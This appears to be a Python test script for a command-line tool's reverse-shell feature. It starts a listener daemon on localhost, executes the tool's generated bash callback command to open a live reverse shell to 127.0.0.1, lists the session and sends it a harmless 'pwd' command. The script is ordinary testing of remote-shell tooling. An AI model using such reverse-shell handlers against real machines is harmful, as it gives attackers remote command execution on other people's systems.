#!/usr/bin/env python3
"""Test the reverse-shell via the non-interactive CLI driver:
--reverse-shell (background daemon) + --rsh-list + --rsh-shell --command."""
import os, sys, time, shutil, subprocess, random, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_rshcli")
shutil.rmtree(DATA, ignore_errors=True)
os.environ["CSCLI_DATA_DIR"] = DATA
subprocess.run(["pkill", "-f", "python.*reverse-shell"], capture_output=True)
time.sleep(1)

PORT = random.randint(23000, 26000)
CLI = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), "cscli")]

def run(args, timeout=40):
    r = subprocess.run(CLI + args, capture_output=True, text=True, timeout=timeout,
                       env={**os.environ})
    return r.returncode, r.stdout, r.stderr

# 1. start reverse-shell listener in background daemon
rc, out, err = run(["--reverse-shell", "--host", "127.0.0.1", "--port", str(PORT),
                    "--callback", "127.0.0.1", "--background"])
print("[reverse-shell]", out.strip()); assert rc == 0, err
data = json.loads(out); assert data["ok"]

# give the daemon a moment to bind the listener port before the target dials it
time.sleep(1.5)

# 2. connect a real bash reverse shell
cbin = data["callback_command"]
bproc = subprocess.Popen(["/bin/bash", "-c", cbin],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# 3. poll --rsh-list until a session shows up
sid = None
for _ in range(20):
    rc, out, err = run(["--rsh-list"])
    d = json.loads(out)
    if d["sessions"]:
        sid = d["sessions"][0]["session"]
        break
    time.sleep(0.5)
assert sid, "no rsh session listed: " + out
print("[rsh-list] session:", sid)

time.sleep(0.5)  # let the shell banner settle
# 4. drive with a deterministic command (pwd) and retry until output arrives
def one_shot(cmd):
    rc, out, err = run(["--rsh-shell", sid, "--command", cmd])
    if rc != 0:
        return {}
    try:
        return json.loads(out)
    except Exception:
        return {}

ok = False
for attempt in range(6):
    res = one_shot("pwd && echo MARKER_$((1+2))")
    if "MARKER_3" in res.get("output", ""):
        ok = True
        print("[rsh-shell pwd] OK:", res.get("output", "")[:80].replace("\n", " | "))
        break
    time.sleep(1.0)

bproc.terminate()
subprocess.run(["pkill", "-f", "python.*reverse-shell"], capture_output=True)
print("\n[PASS]" if ok else "[FAIL]", "reverse-shell CLI driver")
sys.exit(0 if ok else 1)
